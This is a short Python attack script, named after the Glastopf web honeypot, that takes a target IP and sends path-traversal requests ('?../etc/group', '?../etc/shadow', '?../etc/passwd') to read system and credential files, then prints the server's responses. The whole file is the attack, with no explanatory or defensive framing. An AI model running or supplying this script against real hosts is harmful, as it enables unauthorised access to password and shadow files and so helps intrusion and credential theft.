#!/usr/bin/python
import requests
import sys

if len(sys.argv)==2:
    ip=sys.argv[1]
else:
    print('Usage glastopf.py <ip_address>')
    sys.exit(0)

r=requests.get('http://' + ip + "?../etc/group")
print("###################################################")
print("###############  /etc/group      ##################")
print(r)
print("###################################################")

r=requests.get('http://' + ip + "?../etc/shadow")
print("###################################################")
print("###############  /etc/shadow      ##################")
print(r)
print("###################################################")

r=requests.get('http://' + ip + "?../etc/passwd")
print("###################################################")
print("###############  /etc/passwd      ##################")
print(r)
print("###################################################")


r=requests.get('http://' + ip)
print("###################################################")
print(r.text)
print("###################################################")
